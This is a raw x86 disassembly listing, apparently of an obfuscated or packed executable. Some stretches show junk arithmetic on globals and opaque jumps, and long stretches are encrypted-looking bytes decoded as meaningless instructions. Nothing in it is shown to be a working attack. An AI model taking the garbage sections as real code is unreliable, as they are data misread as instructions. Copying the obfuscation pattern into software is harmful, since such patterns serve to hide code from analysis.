  40b300:	mov    ds:0x3d6a761c,al
  40b305:	aaa    
  40b306:	cli    
  40b307:	jge    0x40b2f7
  40b309:	mov    bl,0x6e
  40b30b:	or     edi,edx
  40b30d:	mov    esp,ebx
  40b30f:	mov    BYTE PTR [edx],dl
  40b311:	pop    es
  40b312:	pop    edx
  40b313:	stos   DWORD PTR es:[edi],eax
  40b314:	push   eax
  40b315:	adc    DWORD PTR ds:0x4282fb,0x4282b3
  40b31f:	call   0x416c20
  40b324:	sbb    esi,DWORD PTR ds:0x4282a7
  40b32a:	mov    ecx,DWORD PTR [ebp-0x20]
  40b32d:	adc    esi,0x2986
  40b333:	mov    esi,DWORD PTR [ebp-0x1c]
  40b336:	sbb    DWORD PTR ds:0x42823b,0x4282fb
  40b340:	push   0x5f43
  40b345:	or     edx,0x69b4
  40b34b:	sub    DWORD PTR ds:0x428393,0x4282fb
  40b355:	push   0x1657
  40b35a:	xor    DWORD PTR ds:0x42837b,0x42826f
  40b364:	or     eax,0x528b
  40b369:	xor    edx,esi
  40b36b:	xor    eax,ecx
  40b36d:	sub    DWORD PTR ds:0x4283af,0x42824f
  40b377:	push   edx
  40b378:	push   eax
  40b379:	call   0x416c20
  40b37e:	xor    ecx,ecx
  40b380:	or     ecx,DWORD PTR ds:0x4282af
  40b386:	adc    DWORD PTR ds:0x4281a3,ecx
  40b38c:	mov    ecx,DWORD PTR [ebp-0x28]
  40b38f:	xor    DWORD PTR ds:0x428317,ecx
  40b395:	mov    esi,DWORD PTR [ebp-0x24]
  40b398:	and    DWORD PTR ds:0x428283,0x42826f
  40b3a2:	push   esi
  40b3a3:	add    DWORD PTR ds:0x42817b,0x5412
  40b3ad:	push   ecx
  40b3ae:	sub    DWORD PTR ds:0x428397,0x27f7
  40b3b8:	push   edx
  40b3b9:	push   eax
  40b3ba:	sub    DWORD PTR ds:0x428177,0x4283ab
  40b3c4:	call   0x422072
  40b3c9:	mov    DWORD PTR [ebp-0x30],eax
  40b3cc:	add    eax,DWORD PTR ds:0x42827b
  40b3d2:	mov    DWORD PTR [ebp-0x2c],edx
  40b3d5:	cmp    DWORD PTR ds:0x4282ab,0x0
  40b3dc:	not    esi
  40b3de:	mov    DWORD PTR ds:0x428293,0x6e42
  40b3e8:	jmp    0x40b4a9
  40b3ed:	not    DWORD PTR ds:0x42832b
  40b3f3:	mov    eax,ds:0x4282a3
  40b3f8:	cmp    DWORD PTR ds:0x4282ab,0x0
  40b3ff:	jl     0x40b428
  40b405:	push   0x2496
  40b40a:	push   DWORD PTR [ebp-0x28]
  40b40d:	call   DWORD PTR ds:0x428eec
  40b413:	xor    edx,ecx
  40b415:	and    DWORD PTR ds:0x42819b,edx
  40b41b:	movzx  ecx,WORD PTR ds:0x42828b
  40b422:	or     DWORD PTR ds:0x42831b,ecx
  40b428:	add    esi,edx
  40b42a:	adc    DWORD PTR ds:0x428177,0x1bfc
  40b434:	sub    esi,0x4a2f
  40b43a:	cmp    DWORD PTR ds:0x4283a3,0x0
  40b441:	mov    DWORD PTR ds:0x42831b,ecx
  40b447:	mov    DWORD PTR ds:0x42839b,0x318c
  40b451:	mov    DWORD PTR ds:0x4283ab,0x431a
  40b45b:	jmp    0x40b4a9
  40b460:	mov    DWORD PTR ds:0x428273,0x461b
  40b46a:	mov    DWORD PTR ds:0x4282af,0x63d9
  40b474:	cmp    DWORD PTR ds:0x4283a3,0x0
  40b47b:	jbe    0x40b49b
  40b481:	push   DWORD PTR [ebp-0x1c]
  40b484:	push   0x184b
  40b489:	call   DWORD PTR ds:0x428ef0
  40b48f:	xor    edx,DWORD PTR ds:0x428283
  40b495:	adc    ecx,DWORD PTR ds:0x42838b
  40b49b:	and    DWORD PTR ds:0x42817b,0x404c
  40b4a5:	and    edx,esi
  40b4a7:	add    ecx,edx
  40b4a9:	mov    DWORD PTR [ebp-0x10],0x5fa8
  40b4b0:	movzx  eax,WORD PTR ds:0x42828f
  40b4b7:	xor    DWORD PTR ds:0x4283a3,eax
  40b4bd:	mov    DWORD PTR [ebp-0xc],0x1751
  40b4c4:	dec    DWORD PTR ds:0x428273
  40b4ca:	mov    DWORD PTR [ebp-0x20],0x5e90
  40b4d1:	mov    DWORD PTR [ebp-0x1c],0xfc1
  40b4d8:	cmp    DWORD PTR ds:0x42818f,0x0
  40b4df:	mov    edx,0x29d6
  40b4e4:	mov    ecx,0x5377
  40b4e9:	not    esi
  40b4eb:	movzx  ecx,BYTE PTR ds:0x42816b
  40b4f2:	jmp    0x40b54e
  40b4f7:	mov    DWORD PTR ds:0x42823b,0x9f5
  40b501:	mov    DWORD PTR ds:0x4282b7,0x1c35
  40b50b:	cmp    DWORD PTR ds:0x42818f,0x0
  40b512:	je     0x40b542
  40b518:	push   0x427fe3
  40b51d:	push   0x400000
  40b522:	call   DWORD PTR ds:0x428dd8
  40b528:	sbb    DWORD PTR ds:0x4282a7,edi
  40b52e:	mov    ecx,DWORD PTR ds:0x4281df
  40b534:	xor    edx,edx
  40b536:	or     edx,DWORD PTR ds:0x4283cb
  40b53c:	sub    ecx,edx
  40b53e:	imul   ecx,DWORD PTR [ecx+edx*1]
  40b542:	and    esi,DWORD PTR ds:0x4281ab
  40b548:	sbb    esi,0x2386
  40b54e:	mov    DWORD PTR [ebp-0x28],0x7044
  40b555:	mov    DWORD PTR [ebp-0x24],0x7bf
  40b55c:	mov    eax,DWORD PTR [ebp-0x28]
  40b55f:	sbb    edx,DWORD PTR ds:0x428253
  40b565:	mov    ecx,DWORD PTR [ebp-0x24]
  40b568:	not    DWORD PTR ds:0x428283
  40b56e:	mov    edx,DWORD PTR [ebp-0x20]
  40b571:	or     DWORD PTR ds:0x4282b3,ecx
  40b577:	mov    esi,DWORD PTR [ebp-0x1c]
  40b57a:	sbb    DWORD PTR ds:0x42838b,0x428253
  40b584:	jmp    0x40b97a
  40b589:	adc    DWORD PTR [edx+0x10],esi
  40b58c:	packssdw mm5,QWORD PTR [edx+0xf]
  40b590:	jb     0x40b5e9
  40b592:	jnp    0x40b598
  40b594:	push   0xfffffff4
  40b596:	mul    BYTE PTR [ebp+0x18130abc]
  40b59c:	sbb    BYTE PTR [esi+0x12],ch
  40b59f:	sbb    BYTE PTR [eax],bl
  40b5a1:	push   eax
  40b5a2:	fs cmp al,0xe1
  40b5a5:	mov    bh,0x65
  40b5a7:	xchg   ecx,eax
  40b5a8:	or     al,0x49
  40b5aa:	inc    edx
  40b5ab:	dec    ebx
  40b5ac:	adc    BYTE PTR [ecx-0x9],cl
  40b5af:	scas   al,BYTE PTR es:[edi]
  40b5b0:	pop    esi
  40b5b1:	push   ebp
  40b5b2:	push   ecx
  40b5b3:	out    0x8b,eax
  40b5b5:	and    bh,BYTE PTR [esi+ecx*2-0x10]
  40b5b9:	mov    edx,DWORD PTR [ebp-0x25]
  40b5bc:	lahf   
  40b5bd:	jecxz  0x40b557
  40b5bf:	mov    bl,0xd8
  40b5c1:	call   0x7d47:0xbd50877
  40b5c8:	jmp    0xf4ae:0x7d149277
  40b5cf:	mov    al,ds:0xba65758d
  40b5d4:	sbb    al,0x91
  40b5d6:	xlat   BYTE PTR ds:[ebx]
  40b5d7:	int    0xd9
  40b5d9:	int    0x4b
  40b5db:	fdiv   QWORD PTR [bx+di-0x3d6e]
  40b5e0:	sahf   
  40b5e1:	push   es
  40b5e2:	shr    DWORD PTR [ebp-0x8],1
  40b5e5:	inc    esi
  40b5e6:	pop    esi
  40b5e7:	test   eax,0x4bc6fa40
  40b5ec:	cmc    
  40b5ed:	inc    ebp
  40b5ee:	push   ebx
  40b5ef:	ins    BYTE PTR es:[edi],dx
  40b5f0:	inc    esi
  40b5f1:	push   cs
  40b5f2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b5f3:	pop    edi
  40b5f4:	inc    eax
  40b5f5:	les    edx,FWORD PTR [ebp+0x46f9324a]
  40b5fb:	mov    esi,0x62a0e7e7
  40b600:	jne    0x40b5a4
  40b602:	sbb    ch,BYTE PTR [ecx+0xef1a33b]
  40b608:	xor    al,0xfa
  40b60a:	arpl   WORD PTR [ebp-0x1c],ax
  40b60d:	jge    0x40b5ba
  40b60f:	mov    al,ds:0x1e01fc76
  40b614:	scas   eax,DWORD PTR es:[edi]
  40b615:	ins    DWORD PTR es:[edi],dx
  40b616:	enter  0x9182,0xc
  40b61a:	push   0xffffff90
  40b61c:	lahf   
  40b61d:	add    edx,DWORD PTR [eax-0x5f]
  40b620:	clc    
  40b621:	xor    al,0x22
  40b623:	or     DWORD PTR [esi],ecx
  40b625:	das    
  40b626:	mov    esi,0x8bb5bc12
  40b62b:	adc    ch,BYTE PTR [esi+0x5e]
  40b62e:	stos   DWORD PTR es:[edi],eax
  40b62f:	test   BYTE PTR [ebp-0x4aa0e58d],dh
  40b635:	loope  0x40b6a8
  40b637:	mov    ah,0x8a
  40b639:	dec    eax
  40b63a:	jmp    0x4278:0x19bc5d98
  40b641:	cmp    bl,dl
  40b643:	outs   dx,DWORD PTR ds:[esi]
  40b644:	lods   al,BYTE PTR ds:[esi]
  40b645:	stc    
  40b646:	and    al,0x55
  40b648:	ins    DWORD PTR es:[edi],dx
  40b649:	cld    
  40b64a:	mov    ds:0x9df31ffe,al
  40b64f:	popa   
  40b650:	aas    
  40b651:	test   BYTE PTR [edx],ch
  40b653:	mov    edx,DWORD PTR ds:0x22d46f0b
  40b659:	xchg   edi,eax
  40b65a:	inc    esp
  40b65b:	outs   dx,BYTE PTR ds:[esi]
  40b65c:	pop    ebp
  40b65d:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  40b65f:	inc    esp
  40b660:	test   DWORD PTR [ebx+0x39],ecx
  40b663:	fild   WORD PTR [ecx-0x77]
  40b666:	retf   
  40b667:	cmp    eax,0x79b3f04b
  40b66c:	and    eax,0x8d3fc634
  40b671:	xchg   edx,eax
  40b672:	mov    ds:0x6db9b205,al
  40b677:	stc    
  40b678:	neg    DWORD PTR [edi-0x27]
  40b67b:	mov    al,0xed
  40b67d:	call   DWORD PTR [edi-0x647e460f]
  40b683:	fwait
  40b684:	pop    ecx
  40b685:	fsincos 
  40b687:	retf   0xe9a
  40b68a:	inc    esi
  40b68b:	cmp    DWORD PTR [edx-0x7],0xfffffff4
  40b68f:	ret    0x29d3
  40b692:	fsub   QWORD PTR [edi+esi*4+0x61]
  40b696:	mov    al,0x5d
  40b698:	xor    ebx,ebp
  40b69a:	sub    bh,0xfd
  40b69d:	add    edi,DWORD PTR [edi+eiz*4]
  40b6a0:	test   BYTE PTR [eax+0x5a],cl
  40b6a3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b6a4:	jmp    0x40b6a6
  40b6a6:	rol    BYTE PTR [eax+0x7e],0xef
  40b6aa:	aaa    
  40b6ab:	aad    0x5d
  40b6ad:	inc    ecx
  40b6ae:	out    dx,al
  40b6af:	out    0x2,al
  40b6b1:	xchg   edi,eax
  40b6b2:	xor    eax,0xfff9b324
  40b6b7:	mov    edi,0xeae06243
  40b6bc:	adc    edi,DWORD PTR [eax-0x3a]
  40b6bf:	cli    
  40b6c0:	mov    al,ds:0xbc7d0b88
  40b6c5:	jg     0x40b6fe
  40b6c7:	push   0x19
  40b6c9:	scas   al,BYTE PTR es:[edi]
  40b6ca:	dec    ebp
  40b6cb:	mov    ebx,0xa6199189
  40b6d0:	adc    esp,ecx
  40b6d2:	pop    es
  40b6d3:	(bad)  
  40b6d5:	ins    DWORD PTR es:[edi],dx
  40b6d6:	sbb    ecx,DWORD PTR [ebx+0x3621bf1b]
  40b6dc:	ds ss and eax,0x2e7e519b
  40b6e3:	arpl   WORD PTR [ebp-0x589e333e],dx
  40b6e9:	and    BYTE PTR ds:0xdcad249d,ch
  40b6ef:	ins    BYTE PTR es:[edi],dx
  40b6f0:	sbb    DWORD PTR [esp+ebp*1+0x9cb142c],esi
  40b6f7:	int3   
  40b6f8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b6f9:	(bad)  
  40b6fa:	xor    ebp,ebx
  40b6fc:	js     0x40b6bc
  40b6fe:	inc    esp
  40b6ff:	das    
  40b700:	cmp    eax,0xaf463f93
  40b705:	pop    esp
  40b706:	mov    ah,al
  40b708:	(bad)  [eax+0x4e]
  40b70b:	pop    edi
  40b70c:	std    
  40b70d:	jp     0x40b751
  40b70f:	xor    al,0xaa
  40b711:	icebp  
  40b712:	int3   
  40b713:	push   es
  40b714:	js     0x40b77f
  40b716:	hlt    
  40b717:	cwde   
  40b718:	sub    DWORD PTR [ebp+0x58a04d9f],0x960b9005
  40b722:	xchg   BYTE PTR [edx],ch
  40b724:	call   0xfec7:0x9dfc582f
  40b72b:	int3   
  40b72c:	push   ebx
  40b72d:	mov    ah,BYTE PTR [ebx+esi*2]
  40b730:	shr    DWORD PTR [ebx],0xdc
  40b733:	in     eax,dx
  40b734:	push   eax
  40b735:	cmp    esp,edx
  40b737:	das    
  40b738:	push   edx
  40b739:	shl    ebp,1
  40b73b:	add    DWORD PTR [esi],ebx
  40b73d:	sbb    esi,DWORD PTR [esi+0x76f58d85]
  40b743:	mov    edi,0xe52db3ef
  40b748:	pop    ebx
  40b749:	lea    ebp,[ecx+0xb]
  40b74c:	sub    al,0xc2
  40b74e:	cmp    al,0x9b
  40b750:	into   
  40b751:	imul   edx
  40b753:	loop   0x40b757
  40b755:	sbb    dl,BYTE PTR [eax-0x6e]
  40b758:	(bad)  
  40b759:	jmp    0x40b715
  40b75b:	retf   0x39a7
  40b75e:	pop    eax
  40b75f:	scas   eax,DWORD PTR es:[edi]
  40b760:	pusha  
  40b761:	out    dx,eax
  40b762:	(bad)  
  40b763:	(bad)  
  40b765:	retf   
  40b766:	in     eax,0x0
  40b768:	push   eax
  40b769:	inc    edx
  40b76a:	call   0x97923c9d
  40b76f:	ins    DWORD PTR es:[edi],dx
  40b770:	(bad)  
  40b771:	ds fnstsw WORD PTR fs:[ebx+0x31]
  40b776:	push   esp
  40b777:	mov    BYTE PTR [ebp+0x67],cl
  40b77a:	les    ecx,FWORD PTR [ebx]
  40b77c:	test   dl,bl
  40b77e:	shr    BYTE PTR [esi+0x5d],cl
  40b781:	test   cl,al
  40b783:	sub    ch,BYTE PTR [ebx+0x1c]
  40b786:	fwait
  40b787:	rcr    ebp,1
  40b789:	fcom   st(7)
  40b78b:	inc    eax
  40b78c:	mov    ebx,ds
  40b78e:	cld    
  40b78f:	cwde   
  40b790:	pop    es
  40b791:	sub    bl,BYTE PTR [ebp+0x39b4509f]
  40b797:	sub    DWORD PTR [eax],ebp
  40b799:	adc    BYTE PTR [esp+ecx*1+0xb08b60b],ah
  40b7a0:	pop    esi
  40b7a1:	fisttp DWORD PTR [eax+0x2fe66167]
  40b7a7:	std    
  40b7a8:	jle    0x40b754
  40b7aa:	pushf  
  40b7ab:	jo     0x40b7d6
  40b7ad:	rol    DWORD PTR [eax+0xa3f9854],0x7b
  40b7b4:	lock cwde 
  40b7b6:	jl     0x40b799
  40b7b8:	xlat   BYTE PTR gs:[ebx]
  40b7ba:	jb     0x40b789
  40b7bc:	add    cl,bh
  40b7be:	aam    0x8e
  40b7c0:	nop
  40b7c1:	adc    al,0xcf
  40b7c3:	and    DWORD PTR [edi-0x6],0xffffffcd
  40b7c7:	mov    bl,BYTE PTR [esi*1-0x5f3a8ad4]
  40b7ce:	aam    0xc
  40b7d0:	xor    ecx,edi
  40b7d2:	ret    
  40b7d3:	(bad)  
  40b7d5:	dec    ecx
  40b7d6:	add    eax,0xfe72e3bd
  40b7db:	mov    dh,0xeb
  40b7dd:	call   0x368a:0xf33aaae9
  40b7e4:	fidiv  WORD PTR [esi]
  40b7e6:	in     al,dx
  40b7e7:	ss int3 
  40b7e9:	push   edi
  40b7ea:	jns    0x40b820
  40b7ec:	mov    dl,0xb8
  40b7ee:	fs pop eax
  40b7f0:	repz jp 0x40b86d
  40b7f3:	and    eax,0x180c1f7a
  40b7f8:	or     al,0x56
  40b7fa:	fistp  QWORD PTR [edx]
  40b7fc:	in     al,0x62
  40b7fe:	cmp    BYTE PTR [eax+edx*8+0x15613e7b],ch
  40b805:	pushf  
  40b806:	scas   al,BYTE PTR es:[edi]
  40b807:	outs   dx,DWORD PTR ds:[esi]
  40b808:	push   0x277c3446
  40b80d:	xor    BYTE PTR [esi+ebx*8-0x2d],dl
  40b811:	fiadd  WORD PTR [ebx+0x78]
  40b814:	out    dx,al
  40b815:	js     0x40b7c0
  40b817:	push   ebx
  40b818:	retf   0xe2f7
  40b81b:	sahf   
  40b81c:	pop    ecx
  40b81d:	imul   edi,DWORD PTR [esi+edi*1-0x159f6ecf],0xd3813bf8
  40b828:	shl    cl,0x34
  40b82b:	sbb    ebx,DWORD PTR ds:0xd3122fd9
  40b831:	or     eax,0x6be2f176
  40b836:	push   ebp
  40b837:	es xchg edi,eax
  40b839:	imul   DWORD PTR [eax+eax*4-0x9]
  40b83d:	and    eax,0x9b106961
  40b842:	push   esp
  40b843:	pop    ebp
  40b844:	mov    ah,bl
  40b846:	fld    st(2)
  40b848:	dec    esi
  40b849:	mov    ch,0x25
  40b84b:	dec    eax
  40b84c:	xor    DWORD PTR [ecx],ebp
  40b84e:	jb     0x40b83c
  40b850:	cmc    
  40b851:	xchg   BYTE PTR [esi],bh
  40b853:	(bad)
  40b856:	inc    ebp
  40b857:	idiv   BYTE PTR [edi]
  40b859:	jb     0x40b844
  40b85b:	retf   0xa9e7
  40b85e:	push   edx
  40b85f:	in     al,dx
  40b860:	jmp    0x243e70a
  40b865:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b866:	in     al,0x6a
  40b868:	mov    edx,0x7fc03eda
  40b86d:	dec    eax
  40b86e:	retf   
  40b86f:	push   esp
  40b870:	mov    edi,0x467e6151
  40b875:	dec    esi
  40b876:	or     al,BYTE PTR ds:0x418b1451
  40b87c:	mov    al,0xb9
  40b87e:	dec    ecx
  40b87f:	xchg   edx,eax
  40b880:	ins    BYTE PTR es:[edi],dx
  40b881:	outs   dx,DWORD PTR ds:[esi]
  40b882:	enter  0x4110,0x63
  40b886:	push   0x33
  40b888:	jbe    0x40b839
  40b88a:	scas   al,BYTE PTR es:[edi]
  40b88b:	js     0x40b899
  40b88d:	mov    edi,0x43863ed5
  40b892:	popa   
  40b893:	jmp    0x4165529
  40b898:	ret    
  40b899:	pop    esi
  40b89a:	sub    bh,bh
  40b89c:	cmp    cl,BYTE PTR [edi-0x7]
  40b89f:	fst    st(4)
  40b8a1:	add    DWORD PTR [ebx-0x23],edi
  40b8a4:	clc    
  40b8a5:	add    dl,0xe6
  40b8a8:	cli    
  40b8a9:	cdq    
  40b8aa:	arpl   ax,bp
  40b8ac:	mov    esi,0x28b0ac25
  40b8b1:	in     al,dx
  40b8b2:	fs xchg ebx,eax
  40b8b4:	lods   al,BYTE PTR fs:[esi]
  40b8b6:	fidivr DWORD PTR [ebp-0x38d0535f]
  40b8bc:	jge    0x40b858
  40b8be:	sub    DWORD PTR [edx],0x778c5158
  40b8c4:	test   DWORD PTR [ecx-0x649475ef],edx
  40b8ca:	fistp  QWORD PTR [eax-0x5a6d8984]
  40b8d0:	dec    eax
  40b8d1:	rcl    eax,1
  40b8d3:	in     al,dx
  40b8d4:	(bad)  
  40b8d5:	popf   
  40b8d6:	sbb    DWORD PTR [ebx+0x43],0xd7182a1c
  40b8dd:	dec    ebp
  40b8de:	arpl   bx,ax
  40b8e0:	lods   al,BYTE PTR ds:[esi]
  40b8e1:	arpl   WORD PTR ds:0x937c1dc0,bx
  40b8e7:	out    dx,eax
  40b8e8:	repnz retf 
  40b8ea:	xchg   bh,cl
  40b8ec:	xor    ebx,eax
  40b8ee:	mov    esi,0x2bf58910
  40b8f3:	xchg   edx,eax
  40b8f4:	jmp    0x9ee1b1e7
  40b8f9:	std    
  40b8fa:	cmp    DWORD PTR [edx-0x4a],esi
  40b8fd:	push   edi
  40b8fe:	pop    esp
  40b8ff:	sti    
  40b900:	xor    cl,dl
  40b902:	add    eax,0x133492d3
  40b907:	mov    dh,0xd9
  40b909:	mov    edi,0x6a241b83
  40b90e:	or     DWORD PTR [edx+0x5b3f4a63],edx
  40b914:	jo     0x40b8b7
  40b916:	push   edx
  40b917:	rcr    DWORD PTR [esp+ebp*8],cl
  40b91a:	pop    ds
  40b91b:	outs   dx,DWORD PTR ds:[esi]
  40b91c:	pusha  
  40b91d:	in     eax,0x15
  40b91f:	cwde   
  40b920:	mov    bh,0x92
  40b922:	into   
  40b923:	sbb    esi,DWORD PTR [ecx+0x7d]
  40b926:	mov    esi,0x7d03707a
  40b92b:	sbb    ch,BYTE PTR ds:[eax]
  40b92e:	hlt    
  40b92f:	push   ecx
  40b930:	mov    eax,ds:0x4913b06d
  40b935:	sub    bl,BYTE PTR es:[edx+0x59a1a801]
  40b93c:	pusha  
  40b93d:	bound  ebx,QWORD PTR [edx]
  40b93f:	imul   ebx,eax,0x95847124
  40b945:	add    al,0xfe
  40b947:	jno    0x40b969
  40b949:	je     0x40b98d
  40b94b:	dec    edx
  40b94c:	mov    ebp,ebp
  40b94e:	mov    ebx,0x4852ad38
  40b953:	jbe    0x40b930
  40b955:	call   0xa152d207
  40b95a:	stos   DWORD PTR es:[edi],eax
  40b95b:	aam    0x7d
  40b95d:	jg     0x40b99c
  40b95f:	xchg   esi,eax
  40b960:	jmp    0xd4e3:0x502bc87c
  40b967:	dec    edi
  40b968:	ins    BYTE PTR es:[edi],dx
  40b969:	imul   edi,DWORD PTR [esi],0x388f3b34
  40b96f:	mov    esi,0x21ce3458
  40b974:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b975:	outs   dx,BYTE PTR ds:[esi]
  40b976:	jae    0x40b9ba
  40b978:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b979:	pop    DWORD PTR ds:0x355c
  40b97f:	adc    ecx,0x819
  40b985:	adc    DWORD PTR ds:0x428303,0xc1d
  40b98f:	or     eax,edx
  40b991:	mov    edx,DWORD PTR [ebp-0x10]
  40b994:	or     ecx,esi
  40b996:	and    esi,DWORD PTR ds:0x428287
  40b99c:	mov    esi,DWORD PTR [ebp-0xc]
  40b99f:	and    DWORD PTR ds:0x428317,0x1cd5
  40b9a9:	or     eax,edx
  40b9ab:	cmp    DWORD PTR ds:0x42831f,0x0
  40b9b2:	mov    edx,0xd4e
  40b9b7:	not    edx
  40b9b9:	mov    DWORD PTR ds:0x428287,0x1f80
  40b9c3:	jmp    0x40ba42
  40b9c8:	mov    DWORD PTR ds:0x42831f,0x2492
  40b9d2:	mov    DWORD PTR ds:0x4283af,0xa5a
  40b9dc:	cmp    DWORD PTR ds:0x42831f,0x0
  40b9e3:	jbe    0x40ba20
  40b9e9:	push   DWORD PTR [ebp-0x1c]
  40b9ec:	push   0x148d
  40b9f1:	call   DWORD PTR ds:0x428ddc
  40b9f7:	adc    DWORD PTR ds:0x4283ab,0x175a
  40ba01:	not    edx
  40ba03:	movzx  edx,WORD PTR ds:0x428307
  40ba0a:	sub    edx,DWORD PTR ds:0x42831b
  40ba10:	mov    DWORD PTR ds:0x428307,edx
  40ba16:	adc    DWORD PTR ds:0x428303,0x62d2
  40ba20:	mov    edx,DWORD PTR ds:0x428177
  40ba26:	xor    DWORD PTR ds:0x4283a3,edx
  40ba2c:	or     DWORD PTR ds:0x42824f,0x5c0
  40ba36:	mov    edx,DWORD PTR ds:0x428287
  40ba3c:	or     DWORD PTR ds:0x428323,edx
  40ba42:	mov    edx,DWORD PTR [ebp-0x30]
  40ba45:	or     ecx,esi
  40ba47:	mov    esi,DWORD PTR [ebp-0x2c]
  40ba4a:	or     eax,0xf34
  40ba4f:	or     ecx,0x6c90
  40ba55:	cmp    edx,eax
  40ba57:	jne    0x40ba65
  40ba5d:	cmp    esi,ecx
  40ba5f:	je     0x40cc06
  40ba65:	mov    DWORD PTR [ebp-0x30],0x5ddc
  40ba6c:	mov    DWORD PTR [ebp-0x2c],0x7433
  40ba73:	mov    eax,DWORD PTR [ebp-0x30]
  40ba76:	mov    ecx,DWORD PTR [ebp-0x2c]
  40ba79:	xor    ecx,0xfffffd1f
  40ba7f:	xor    eax,0xffff9fff
  40ba84:	and    ecx,0x6e0
  40ba8a:	and    eax,0x6244
  40ba8f:	mov    DWORD PTR [ebp-0x10],eax
  40ba92:	jmp    0x40be88
  40ba97:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ba98:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ba99:	test   al,0x41
  40ba9b:	test   al,0x3d
  40ba9d:	sbb    al,0x1c
  40ba9f:	fdiv   QWORD PTR [edx]
  40baa1:	mov    bl,0x7c
  40baa3:	icebp  
  40baa4:	dec    ecx
  40baa5:	mov    DWORD PTR [eax+eiz*2+0xd],edi
  40baa9:	sbb    BYTE PTR [eax],bl
  40baab:	outs   dx,BYTE PTR ds:[esi]
  40baac:	adc    bl,BYTE PTR [eax]
  40baae:	sbb    BYTE PTR [esi],bl
  40bab0:	mov    eax,ds:0x1effdecb
  40bab5:	push   cs
  40bab6:	cmp    al,0xe7
  40bab8:	cmp    BYTE PTR [eax],dh
  40baba:	lods   eax,DWORD PTR ds:[esi]
  40babb:	mov    eax,ds:0x292d5b51
  40bac0:	fbstp  TBYTE PTR [esi]
  40bac2:	pop    esp
  40bac3:	call   FWORD PTR [edi]
  40bac5:	aam    0xbd
  40bac7:	sub    edi,DWORD PTR [edi+ecx*8+0x5]
  40bacb:	retf   0xdff6
  40bace:	push   eax
  40bacf:	aaa    
  40bad0:	dec    esp
  40bad1:	adc    ch,BYTE PTR [esi]
  40bad3:	dec    ebx
  40bad4:	scas   eax,DWORD PTR es:[edi]
  40bad5:	(bad)  
  40bad6:	rcr    BYTE PTR [eax],0x17
  40bad9:	xor    al,BYTE PTR [ecx-0x6124befb]
  40badf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bae0:	pop    ebp
  40bae1:	xor    eax,0x1d1ff894
  40bae6:	sub    bh,BYTE PTR [ebx]
  40bae8:	pop    ebx
  40bae9:	add    DWORD PTR [edx+0x2],esi
  40baec:	push   edx
  40baed:	push   edx
  40baee:	imul   ebx,DWORD PTR [ecx],0xddbec0e5
  40baf4:	ins    DWORD PTR es:[edi],dx
  40baf5:	inc    ecx
  40baf6:	fisttp WORD PTR [ebx+0x20527850]
  40bafc:	imul   esp,DWORD PTR [edx+0x61],0xee35fd72
  40bb03:	pusha  
  40bb04:	sub    al,0xbf
  40bb06:	(bad)  
  40bb08:	sub    cl,dh
  40bb0a:	ret    
  40bb0b:	fdiv   QWORD PTR [eax]
  40bb0d:	fst    QWORD PTR [eax-0x325c43c0]
  40bb13:	pop    ebp
  40bb14:	es fcmovnb st,st(0)
  40bb17:	das    
  40bb18:	ror    ebx,1
  40bb1a:	inc    esp
  40bb1b:	fsub   st,st(3)
  40bb1d:	inc    edi
  40bb1e:	xor    BYTE PTR [edx-0x3e],ch
  40bb21:	fucomip st,st(2)
  40bb23:	mov    bl,0xc7
  40bb25:	lahf   
  40bb26:	stc    
  40bb27:	mov    esp,0xc3e29aa
  40bb2c:	or     BYTE PTR [ecx+0x70],ch
  40bb2f:	mov    dh,0x38
  40bb31:	rol    DWORD PTR [ebx+0x56],cl
  40bb34:	push   es
  40bb35:	mov    ds:0xf6bbfdca,al
  40bb3a:	shl    edi,0xdd
  40bb3d:	ins    BYTE PTR es:[edi],dx
  40bb3e:	in     eax,dx
  40bb3f:	fstp   TBYTE PTR [ebx]
  40bb41:	test   al,0x5d
  40bb43:	pop    ebx
  40bb44:	and    BYTE PTR [ecx-0x6f887a0b],dl
  40bb4a:	loope  0x40bb01
  40bb4c:	pushf  
  40bb4d:	sar    DWORD PTR [ecx],cl
  40bb4f:	mov    bh,BYTE PTR [esi+0x77]
  40bb52:	fisttp QWORD PTR [ecx-0x581f7f9a]
  40bb58:	mov    al,ds:0xd8f0bf1a
  40bb5d:	hlt    
  40bb5e:	inc    edi
  40bb5f:	and    ebp,ebx
  40bb61:	mov    bh,0xce
  40bb63:	xor    BYTE PTR [edi+eax*1],ch
  40bb66:	(bad)  
  40bb67:	sbb    eax,0xf86029a5
  40bb6c:	cmc    
  40bb6d:	push   ecx
  40bb6e:	in     al,0xf2
  40bb70:	sub    BYTE PTR [ecx-0x614926d1],bh
  40bb76:	out    dx,al
  40bb77:	shr    BYTE PTR [ebx],0xdd
  40bb7a:	xor    al,0x8
  40bb7c:	mov    al,ds:0xc02bfdcb
  40bb81:	ds inc eax
  40bb83:	in     al,0x3e
  40bb85:	fisub  WORD PTR ds:[esi+0x3a2e6283]
  40bb8c:	jl     0x40bbb6
  40bb8e:	and    esi,DWORD PTR [eax]
  40bb90:	xchg   ebx,eax
  40bb91:	add    BYTE PTR [ecx+0x630985f3],0x17
  40bb98:	pusha  
  40bb99:	inc    edx
  40bb9a:	iret   
  40bb9b:	mov    ds:0xef270bd5,eax
  40bba0:	idiv   DWORD PTR [eax+0x69]
  40bba3:	adc    al,0xb2
  40bba5:	ret    0x1884
  40bba8:	shl    bl,0x61
  40bbab:	test   ebp,esi
  40bbad:	sahf   
  40bbae:	aaa    
  40bbaf:	aad    0xf1
  40bbb1:	mov    ss,WORD PTR [edx]
  40bbb3:	cmp    DWORD PTR [edi+0x4a17a26f],0x48e9f7c8
  40bbbd:	jo     0x40bb53
  40bbbf:	fimul  DWORD PTR [ecx+eax*4+0x37]
  40bbc3:	add    eax,0x95302028
  40bbc8:	daa    
  40bbc9:	fadd   QWORD PTR [edi-0x45]
  40bbcc:	imul   ecx,DWORD PTR [edx-0x44],0x5
  40bbd0:	test   eax,0x12bffa52
  40bbd5:	mov    ds:0x560357bf,eax
